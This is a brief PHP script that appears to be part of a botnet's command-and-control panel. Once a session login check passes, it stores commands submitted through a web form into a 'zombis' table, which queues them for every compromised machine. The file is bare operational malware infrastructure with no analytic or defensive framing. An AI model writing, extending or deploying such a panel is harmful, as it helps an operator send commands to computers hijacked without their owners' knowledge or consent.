<?php @session_start(); if ( !isset($_SESSION['login']) ){ header ("Location: ../../");  exit() ; }	?>
<?php
require_once('../../includes.php'); 

if( isset($_POST['ComandosCmds']) && !empty($_POST['ComandosCmds']) ){

    $Datos = array ('cmds' => $_POST['ComandosCmds']);
	$UpdateBuscar = array('id' > 0) ;
	$Result = $DB->Update('zombis' , false , $Datos , $UpdateBuscar) ;
	echo $Result['msg'] ;
	


}
?>

